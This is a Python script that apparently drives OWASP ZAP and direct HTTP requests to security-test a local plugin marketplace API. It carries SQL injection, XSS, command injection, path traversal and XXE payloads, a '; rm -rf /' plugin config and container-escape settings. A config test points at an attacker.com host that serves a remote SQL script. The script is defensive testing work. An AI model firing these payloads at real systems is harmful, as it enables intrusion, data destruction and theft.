#!/usr/bin/env python3
"""
OWASP ZAP Security Testing Script for Plugin Management System
Performs comprehensive security scanning including:
- Spider crawling
- Active security scanning
- API security testing
- Authentication testing
- Plugin-specific security checks
"""

import json
import time
import sys
import os
import logging
import requests
from datetime import datetime, timedelta
from zapv2 import ZAPv2

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('zap-security-scan.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class PluginSecurityTester:
    def __init__(self, base_url='http://localhost:4400', zap_proxy='http://127.0.0.1:8080'):
        self.base_url = base_url
        self.zap_proxy = zap_proxy
        self.zap = ZAPv2(proxies={'http': zap_proxy, 'https': zap_proxy})
        self.session_name = f"plugin-security-scan-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
        
        # Test credentials and tokens
        self.test_auth_token = os.getenv('TEST_AUTH_TOKEN', 'test-bearer-token')
        self.admin_auth_token = os.getenv('ADMIN_AUTH_TOKEN', 'admin-bearer-token')
        
        # Plugin-specific endpoints to test
        self.plugin_endpoints = [
            '/api/plugins',
            '/api/plugins/search',
            '/api/plugins/categories',
            '/api/marketplace/featured',
            '/api/admin/plugins',
            '/api/admin/plugins/health',
            '/api/admin/system/resources'
        ]
        
        # Dynamic endpoints that require plugin IDs
        self.dynamic_endpoints = [
            '/api/plugins/{plugin_id}',
            '/api/plugins/{plugin_id}/install',
            '/api/plugins/{plugin_id}/uninstall',
            '/api/plugins/{plugin_id}/config',
            '/api/plugins/{plugin_id}/health',
            '/api/plugins/{plugin_id}/logs',
            '/api/plugins/{plugin_id}/metrics'
        ]
        
        # Authentication endpoints
        self.auth_endpoints = [
            '/api/auth/login',
            '/api/auth/logout',
            '/api/auth/refresh',
            '/api/auth/verify'
        ]
        
    def setup_zap_session(self):
        """Initialize ZAP session and configure basic settings"""
        logger.info("Setting up ZAP session...")
        
        try:
            # Create new session
            self.zap.core.new_session(self.session_name, overwrite=True)
            
            # Configure ZAP settings for plugin testing
            self.zap.core.set_option_maximum_alert_instances(500)
            self.zap.core.set_option_merge_related_alerts(True)
            
            # Set up authentication
            self.setup_authentication()
            
            # Configure spider settings
            self.zap.spider.set_option_max_depth(5)
            self.zap.spider.set_option_max_duration(10)  # 10 minutes max
            
            # Configure active scanner settings
            self.zap.ascan.set_option_max_scan_duration_in_mins(15)
            self.zap.ascan.set_option_delay_in_ms(100)  # Be gentle with the server
            
            logger.info("ZAP session setup completed")
            
        except Exception as e:
            logger.error(f"Failed to setup ZAP session: {e}")
            raise
    
    def setup_authentication(self):
        """Configure authentication for protected endpoints"""
        logger.info("Setting up authentication...")
        
        try:
            # Set up form-based authentication (if applicable)
            auth_method = 'formBasedAuthentication'
            login_url = f'{self.base_url}/login'
            
            # Configure authentication method
            self.zap.authentication.set_authentication_method(
                contextid=0,
                authmethodname=auth_method,
                authmethodconfigparams=f'loginUrl={login_url}&loginRequestData=username={{%username%}}&password={{%password%}}'
            )
            
            # Set up users for testing
            self.setup_test_users()
            
        except Exception as e:
            logger.warning(f"Authentication setup failed: {e}")
            # Continue without authentication - some tests will still be valuable
    
    def setup_test_users(self):
        """Set up test users with different permission levels"""
        users = [
            {
                'name': 'regular_user',
                'credentials': 'username=testuser&password=testpass123',
                'enabled': True
            },
            {
                'name': 'admin_user', 
                'credentials': 'username=admin&password=adminpass123',
                'enabled': True
            },
            {
                'name': 'plugin_installer',
                'credentials': 'username=installer&password=installpass123',
                'enabled': True
            }
        ]
        
        for user in users:
            try:
                user_id = self.zap.users.new_user(
                    contextid=0,
                    name=user['name']
                )
                
                self.zap.users.set_authentication_credentials(
                    contextid=0,
                    userid=user_id,
                    authcredentialsconfigparams=user['credentials']
                )
                
                self.zap.users.set_user_enabled(
                    contextid=0,
                    userid=user_id,
                    enabled=user['enabled']
                )
                
            except Exception as e:
                logger.warning(f"Failed to setup user {user['name']}: {e}")
    
    def spider_application(self):
        """Perform spider crawling to discover all endpoints"""
        logger.info("Starting spider crawling...")
        
        try:
            # Start spider with different entry points
            spider_urls = [
                self.base_url,
                f"{self.base_url}/marketplace",
                f"{self.base_url}/admin",
                f"{self.base_url}/plugins",
                f"{self.base_url}/api/plugins"
            ]
            
            for url in spider_urls:
                logger.info(f"Spidering: {url}")
                spider_id = self.zap.spider.scan(url)
                
                # Wait for spider to complete
                while int(self.zap.spider.status(spider_id)) < 100:
                    time.sleep(2)
                    progress = self.zap.spider.status(spider_id)
                    logger.info(f"Spider progress: {progress}%")
            
            # Get spider results
            spider_results = self.zap.spider.results()
            logger.info(f"Spider found {len(spider_results)} URLs")
            
            return spider_results
            
        except Exception as e:
            logger.error(f"Spider crawling failed: {e}")
            return []
    
    def test_api_endpoints(self):
        """Test API endpoints for common vulnerabilities"""
        logger.info("Testing API endpoints...")
        
        vulnerabilities_found = []
        
        # Test static endpoints
        for endpoint in self.plugin_endpoints:
            url = f"{self.base_url}{endpoint}"
            logger.info(f"Testing endpoint: {endpoint}")
            
            # Test different HTTP methods
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
            
            for method in methods:
                try:
                    vuln = self.test_endpoint_method(url, method)
                    if vuln:
                        vulnerabilities_found.extend(vuln)
                except Exception as e:
                    logger.warning(f"Failed to test {method} {url}: {e}")
        
        # Test dynamic endpoints with sample plugin IDs
        sample_plugin_ids = ['test-plugin', 'admin', '../../../etc/passwd', '<script>alert(1)</script>']
        
        for endpoint_template in self.dynamic_endpoints:
            for plugin_id in sample_plugin_ids:
                endpoint = endpoint_template.format(plugin_id=plugin_id)
                url = f"{self.base_url}{endpoint}"
                
                try:
                    vuln = self.test_endpoint_security(url)
                    if vuln:
                        vulnerabilities_found.extend(vuln)
                except Exception as e:
                    logger.warning(f"Failed to test {url}: {e}")
        
        return vulnerabilities_found
    
    def test_endpoint_method(self, url, method):
        """Test specific HTTP method on endpoint"""
        vulnerabilities = []
        
        headers = {
            'Authorization': f'Bearer {self.test_auth_token}',
            'Content-Type': 'application/json',
            'User-Agent': 'ZAP-Security-Test'
        }
        
        # Test without authentication
        self.test_unauthorized_access(url, method, vulnerabilities)
        
        # Test with various payloads
        payloads = self.get_security_payloads()
        
        for payload_type, payload in payloads.items():
            try:
                if method in ['POST', 'PUT', 'PATCH']:
                    response = requests.request(
                        method, url, 
                        json=payload, 
                        headers=headers,
                        timeout=10
                    )
                else:
                    # For GET, add payload as query parameter
                    params = {'test_param': json.dumps(payload)} if payload else {}
                    response = requests.request(
                        method, url,
                        params=params,
                        headers=headers,
                        timeout=10
                    )
                
                # Analyze response for vulnerabilities
                self.analyze_response_for_vulnerabilities(
                    url, method, payload_type, response, vulnerabilities
                )
                
            except requests.RequestException as e:
                logger.debug(f"Request failed for {method} {url} with {payload_type}: {e}")
        
        return vulnerabilities
    
    def test_endpoint_security(self, url):
        """Perform comprehensive security testing on an endpoint"""
        vulnerabilities = []
        
        # Path traversal test
        if self.test_path_traversal(url):
            vulnerabilities.append({
                'type': 'Path Traversal',
                'url': url,
                'severity': 'High',
                'description': 'Endpoint may be vulnerable to path traversal attacks'
            })
        
        # SQL injection test (if applicable)
        if self.test_sql_injection(url):
            vulnerabilities.append({
                'type': 'SQL Injection',
                'url': url,
                'severity': 'Critical',
                'description': 'Endpoint may be vulnerable to SQL injection'
            })
        
        # XSS test
        if self.test_xss(url):
            vulnerabilities.append({
                'type': 'Cross-Site Scripting (XSS)',
                'url': url,
                'severity': 'Medium',
                'description': 'Endpoint may be vulnerable to XSS attacks'
            })
        
        # Command injection test
        if self.test_command_injection(url):
            vulnerabilities.append({
                'type': 'Command Injection',
                'url': url,
                'severity': 'Critical',
                'description': 'Endpoint may be vulnerable to command injection'
            })
        
        return vulnerabilities
    
    def test_unauthorized_access(self, url, method, vulnerabilities):
        """Test if endpoint allows unauthorized access"""
        try:
            response = requests.request(method, url, timeout=10)
            
            # If we get 200 OK without authentication, it's a security issue for admin endpoints
            if response.status_code == 200 and '/admin/' in url:
                vulnerabilities.append({
                    'type': 'Unauthorized Access',
                    'url': url,
                    'method': method,
                    'severity': 'High',
                    'description': 'Admin endpoint accessible without authentication'
                })
            
            # Check for information disclosure in error messages
            if response.status_code >= 400:
                if any(keyword in response.text.lower() for keyword in 
                      ['stack trace', 'exception', 'error:', 'debug', 'mysql', 'postgresql']):
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'url': url,
                        'method': method,
                        'severity': 'Medium',
                        'description': 'Error response contains sensitive information'
                    })
                    
        except requests.RequestException:
            pass  # Connection errors are not security vulnerabilities
    
    def get_security_payloads(self):
        """Get various security testing payloads"""
        return {
            'sql_injection': {
                'id': "' OR '1'='1",
                'name': "'; DROP TABLE plugins; --",
                'query': "1' UNION SELECT * FROM users --"
            },
            'xss': {
                'name': '<script>alert("XSS")</script>',
                'description': '"><script>alert("XSS")</script>',
                'search': 'javascript:alert("XSS")'
            },
            'command_injection': {
                'command': '; cat /etc/passwd',
                'name': '$(cat /etc/passwd)',
                'config': '`whoami`'
            },
            'path_traversal': {
                'file': '../../../etc/passwd',
                'path': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'config': '../../../../../../../../etc/shadow'
            },
            'nosql_injection': {
                'filter': '{"$where": "this.username == this.password"}',
                'query': '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
            },
            'xxe': {
                'xml': '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
            }
        }
    
    def analyze_response_for_vulnerabilities(self, url, method, payload_type, response, vulnerabilities):
        """Analyze HTTP response for potential vulnerabilities"""
        
        # Check response time for potential time-based attacks
        if response.elapsed.total_seconds() > 5:
            vulnerabilities.append({
                'type': 'Potential Time-Based Attack Vector',
                'url': url,
                'method': method,
                'payload_type': payload_type,
                'severity': 'Low',
                'description': f'Response time was {response.elapsed.total_seconds()}s, indicating possible time-based vulnerability'
            })
        
        # Check for reflected payloads (potential XSS)
        if payload_type == 'xss' and '<script>' in response.text:
            vulnerabilities.append({
                'type': 'Reflected XSS',
                'url': url,
                'method': method,
                'severity': 'High',
                'description': 'XSS payload was reflected in response'
            })
        
        # Check for SQL error messages
        sql_errors = [
            'mysql', 'postgresql', 'oracle', 'sqlite',
            'syntax error', 'sql error', 'database error',
            'ORA-', 'MySQL', 'PostgreSQL'
        ]
        
        if payload_type == 'sql_injection':
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    vulnerabilities.append({
                        'type': 'SQL Injection (Error-based)',
                        'url': url,
                        'method': method,
                        'severity': 'Critical',
                        'description': f'SQL error message detected: {error}'
                    })
                    break
        
        # Check for path traversal success
        if payload_type == 'path_traversal' and 'root:' in response.text:
            vulnerabilities.append({
                'type': 'Path Traversal',
                'url': url,
                'method': method,
                'severity': 'Critical',
                'description': 'Successfully accessed /etc/passwd file'
            })
        
        # Check for command injection
        if payload_type == 'command_injection':
            command_indicators = ['uid=', 'gid=', 'groups=', 'root', 'administrator']
            if any(indicator in response.text.lower() for indicator in command_indicators):
                vulnerabilities.append({
                    'type': 'Command Injection',
                    'url': url,
                    'method': method,
                    'severity': 'Critical',
                    'description': 'Command execution output detected in response'
                })
    
    def test_path_traversal(self, url):
        """Test for path traversal vulnerabilities"""
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace('{plugin_id}', payload) if '{plugin_id}' in url else f"{url}?file={payload}"
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200 and 'root:' in response.text:
                    return True
            except:
                continue
        
        return False
    
    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE test; --",
            "1' UNION SELECT null, version() --",
            "admin'/**/OR/**/'1'='1",
            "1'; WAITFOR DELAY '00:00:05' --"
        ]
        
        baseline_time = None
        try:
            baseline_response = requests.get(url.replace('{plugin_id}', 'normal-plugin'), timeout=10)
            baseline_time = baseline_response.elapsed.total_seconds()
        except:
            baseline_time = 1
        
        for payload in payloads:
            try:
                test_url = url.replace('{plugin_id}', payload) if '{plugin_id}' in url else f"{url}?id={payload}"
                response = requests.get(test_url, timeout=10)
                
                # Check for SQL errors
                sql_indicators = ['mysql', 'postgresql', 'syntax error', 'ora-', 'sqlite']
                if any(indicator in response.text.lower() for indicator in sql_indicators):
                    return True
                
                # Check for time-based injection
                if 'WAITFOR' in payload and response.elapsed.total_seconds() > baseline_time + 3:
                    return True
                    
            except:
                continue
        
        return False
    
    def test_xss(self, url):
        """Test for XSS vulnerabilities"""
        payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "javascript:alert('XSS')",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>'
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace('{plugin_id}', payload) if '{plugin_id}' in url else f"{url}?q={payload}"
                response = requests.get(test_url, timeout=5)
                
                if payload in response.text:
                    return True
            except:
                continue
        
        return False
    
    def test_command_injection(self, url):
        """Test for command injection vulnerabilities"""
        payloads = [
            '; cat /etc/passwd',
            '| whoami',
            '`id`',
            '$(whoami)',
            '; ping -c 4 127.0.0.1'
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace('{plugin_id}', payload) if '{plugin_id}' in url else f"{url}?cmd={payload}"
                response = requests.get(test_url, timeout=10)
                
                command_outputs = ['uid=', 'gid=', 'root:', '64 bytes from']
                if any(output in response.text for output in command_outputs):
                    return True
            except:
                continue
        
        return False
    
    def run_active_scan(self):
        """Run ZAP active scanner"""
        logger.info("Starting active security scan...")
        
        try:
            # Start active scan on the target
            scan_id = self.zap.ascan.scan(self.base_url)
            
            # Wait for scan to complete
            while int(self.zap.ascan.status(scan_id)) < 100:
                time.sleep(5)
                progress = self.zap.ascan.status(scan_id)
                logger.info(f"Active scan progress: {progress}%")
                
                # Check for any high-priority alerts during scan
                alerts = self.zap.core.alerts('High')
                if alerts:
                    logger.warning(f"High priority alerts found during scan: {len(alerts)}")
            
            logger.info("Active scan completed")
            return scan_id
            
        except Exception as e:
            logger.error(f"Active scan failed: {e}")
            return None
    
    def test_plugin_specific_security(self):
        """Test plugin-specific security vulnerabilities"""
        logger.info("Testing plugin-specific security issues...")
        
        vulnerabilities = []
        
        # Test plugin installation security
        plugin_install_vulns = self.test_plugin_installation_security()
        vulnerabilities.extend(plugin_install_vulns)
        
        # Test plugin configuration security
        config_vulns = self.test_plugin_configuration_security()
        vulnerabilities.extend(config_vulns)
        
        # Test plugin sandbox escape
        sandbox_vulns = self.test_plugin_sandbox_security()
        vulnerabilities.extend(sandbox_vulns)
        
        return vulnerabilities
    
    def test_plugin_installation_security(self):
        """Test security of plugin installation process"""
        vulnerabilities = []
        
        # Test malicious plugin installation
        malicious_configs = [
            {
                'name': '../../../etc/passwd',
                'command': '; rm -rf /',
                'dockerfile': 'FROM alpine\nRUN cat /etc/passwd'
            },
            {
                'image': 'malicious/rootkit:latest',
                'privileged': True,
                'capabilities': ['SYS_ADMIN', 'NET_ADMIN']
            },
            {
                'volumes': ['/etc:/host-etc:rw', '/var:/host-var:rw'],
                'network': 'host'
            }
        ]
        
        for config in malicious_configs:
            try:
                response = requests.post(
                    f"{self.base_url}/api/plugins/malicious-test/install",
                    json={'config': config},
                    headers={'Authorization': f'Bearer {self.test_auth_token}'},
                    timeout=10
                )
                
                # Installation should be blocked
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Malicious Plugin Installation',
                        'severity': 'Critical',
                        'description': 'System allows installation of potentially malicious plugins'
                    })
                
            except:
                continue
        
        return vulnerabilities
    
    def test_plugin_configuration_security(self):
        """Test plugin configuration security"""
        vulnerabilities = []
        
        # Test configuration injection
        injection_configs = [
            {'apiUrl': 'file:///etc/passwd'},
            {'command': '; cat /etc/shadow'},
            {'script': '<script>alert("XSS")</script>'},
            {'ldapUrl': 'ldap://attacker.com/'},
            {'jdbcUrl': 'jdbc:h2:mem:testdb;INIT=RUNSCRIPT FROM \'http://attacker.com/malicious.sql\''}
        ]
        
        for config in injection_configs:
            try:
                response = requests.put(
                    f"{self.base_url}/api/plugins/test-plugin/config",
                    json={'config': config},
                    headers={'Authorization': f'Bearer {self.test_auth_token}'},
                    timeout=10
                )
                
                # Check if dangerous configurations are accepted
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Configuration Injection',
                        'severity': 'High',
                        'description': 'System accepts potentially dangerous plugin configurations'
                    })
                    
            except:
                continue
        
        return vulnerabilities
    
    def test_plugin_sandbox_security(self):
        """Test plugin sandbox security"""
        vulnerabilities = []
        
        # Test container escape attempts
        escape_tests = [
            {'privileged': True},
            {'capabilities': ['SYS_ADMIN']},
            {'pidMode': 'host'},
            {'networkMode': 'host'},
            {'ipc': 'host'},
            {'volumes': ['/var/run/docker.sock:/var/run/docker.sock']}
        ]
        
        for test in escape_tests:
            try:
                response = requests.post(
                    f"{self.base_url}/api/plugins/escape-test/install",
                    json={'dockerConfig': test},
                    headers={'Authorization': f'Bearer {self.admin_auth_token}'},
                    timeout=10
                )
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Container Escape Risk',
                        'severity': 'Critical',
                        'description': f'System allows potentially dangerous container configuration: {test}'
                    })
                    
            except:
                continue
        
        return vulnerabilities
    
    def generate_security_report(self):
        """Generate comprehensive security report"""
        logger.info("Generating security report...")
        
        # Get ZAP alerts
        zap_alerts = self.zap.core.alerts()
        
        # Categorize alerts by severity
        critical_alerts = [alert for alert in zap_alerts if alert['risk'] == 'High']
        high_alerts = [alert for alert in zap_alerts if alert['risk'] == 'Medium']
        medium_alerts = [alert for alert in zap_alerts if alert['risk'] == 'Low']
        low_alerts = [alert for alert in zap_alerts if alert['risk'] == 'Informational']
        
        # Generate report
        report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'target': self.base_url,
                'scanner': 'OWASP ZAP',
                'session': self.session_name
            },
            'summary': {
                'total_alerts': len(zap_alerts),
                'critical': len(critical_alerts),
                'high': len(high_alerts),
                'medium': len(medium_alerts),
                'low': len(low_alerts)
            },
            'alerts': {
                'critical': critical_alerts,
                'high': high_alerts,
                'medium': medium_alerts,
                'low': low_alerts
            },
            'recommendations': self.generate_security_recommendations(zap_alerts)
        }
        
        # Save report
        report_filename = f"security-report-{datetime.now().strftime('%Y%m%d-%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Security report saved to {report_filename}")
        
        return report
    
    def generate_security_recommendations(self, alerts):
        """Generate security recommendations based on findings"""
        recommendations = []
        
        alert_types = set(alert['name'] for alert in alerts)
        
        if 'Cross Site Scripting (Reflected)' in alert_types:
            recommendations.append({
                'type': 'XSS Prevention',
                'priority': 'High',
                'description': 'Implement proper input validation and output encoding',
                'actions': [
                    'Sanitize all user inputs',
                    'Use Content Security Policy (CSP)',
                    'Encode output data',
                    'Use secure templating engines'
                ]
            })
        
        if 'SQL Injection' in alert_types:
            recommendations.append({
                'type': 'SQL Injection Prevention',
                'priority': 'Critical',
                'description': 'Use parameterized queries and input validation',
                'actions': [
                    'Replace dynamic SQL with parameterized queries',
                    'Implement strict input validation',
                    'Use ORM with built-in protections',
                    'Apply principle of least privilege to database users'
                ]
            })
        
        if 'Path Traversal' in alert_types:
            recommendations.append({
                'type': 'Path Traversal Prevention',
                'priority': 'High',
                'description': 'Implement proper file access controls',
                'actions': [
                    'Validate and sanitize file paths',
                    'Use whitelist of allowed paths',
                    'Implement chroot or containerization',
                    'Never trust user-supplied file paths'
                ]
            })
        
        # Plugin-specific recommendations
        recommendations.append({
            'type': 'Plugin Security',
            'priority': 'High',
            'description': 'Enhance plugin security controls',
            'actions': [
                'Implement plugin sandboxing',
                'Validate plugin configurations',
                'Use least privilege containers',
                'Monitor plugin behavior',
                'Implement plugin signing/verification'
            ]
        })
        
        return recommendations
    
    def run_full_security_scan(self):
        """Run comprehensive security testing"""
        start_time = datetime.now()
        logger.info(f"Starting comprehensive security scan at {start_time}")
        
        try:
            # Setup ZAP session
            self.setup_zap_session()
            
            # Spider the application
            spider_results = self.spider_application()
            
            # Test API endpoints manually
            api_vulnerabilities = self.test_api_endpoints()
            
            # Test plugin-specific security
            plugin_vulnerabilities = self.test_plugin_specific_security()
            
            # Run ZAP active scanner
            scan_id = self.run_active_scan()
            
            # Generate comprehensive report
            report = self.generate_security_report()
            
            # Add manual test results to report
            report['manual_testing'] = {
                'api_vulnerabilities': api_vulnerabilities,
                'plugin_vulnerabilities': plugin_vulnerabilities
            }
            
            end_time = datetime.now()
            duration = end_time - start_time
            
            logger.info(f"Security scan completed in {duration}")
            logger.info(f"Total alerts found: {report['summary']['total_alerts']}")
            logger.info(f"Critical/High priority alerts: {report['summary']['critical'] + report['summary']['high']}")
            
            return report
            
        except Exception as e:
            logger.error(f"Security scan failed: {e}")
            raise

def main():
    """Main function to run security tests"""
    
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description='Plugin Management Security Scanner')
    parser.add_argument('--url', default='http://localhost:4400', help='Base URL to test')
    parser.add_argument('--zap-proxy', default='http://127.0.0.1:8080', help='ZAP proxy URL')
    parser.add_argument('--output-dir', default='.', help='Output directory for reports')
    parser.add_argument('--quick', action='store_true', help='Run quick scan only')
    
    args = parser.parse_args()
    
    # Change to output directory
    if args.output_dir != '.':
        os.chdir(args.output_dir)
    
    # Create security tester
    tester = PluginSecurityTester(args.url, args.zap_proxy)
    
    try:
        if args.quick:
            logger.info("Running quick security scan...")
            # Quick scan - API testing only
            tester.setup_zap_session()
            api_vulnerabilities = tester.test_api_endpoints()
            plugin_vulnerabilities = tester.test_plugin_specific_security()
            
            # Simple report
            report = {
                'scan_type': 'quick',
                'timestamp': datetime.now().isoformat(),
                'vulnerabilities': api_vulnerabilities + plugin_vulnerabilities
            }
            
            with open('quick-security-report.json', 'w') as f:
                json.dump(report, f, indent=2)
                
            print(f"Quick scan found {len(report['vulnerabilities'])} potential vulnerabilities")
            
        else:
            # Full security scan
            report = tester.run_full_security_scan()
            
            # Print summary
            print("\n" + "="*50)
            print("SECURITY SCAN SUMMARY")
            print("="*50)
            print(f"Total Alerts: {report['summary']['total_alerts']}")
            print(f"Critical: {report['summary']['critical']}")
            print(f"High: {report['summary']['high']}")
            print(f"Medium: {report['summary']['medium']}")
            print(f"Low: {report['summary']['low']}")
            
            # Exit with error code if critical/high vulnerabilities found
            if report['summary']['critical'] + report['summary']['high'] > 0:
                print("\nCRITICAL OR HIGH PRIORITY VULNERABILITIES FOUND!")
                sys.exit(1)
            
        logger.info("Security scan completed successfully")
        
    except KeyboardInterrupt:
        logger.info("Security scan interrupted by user")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Security scan failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()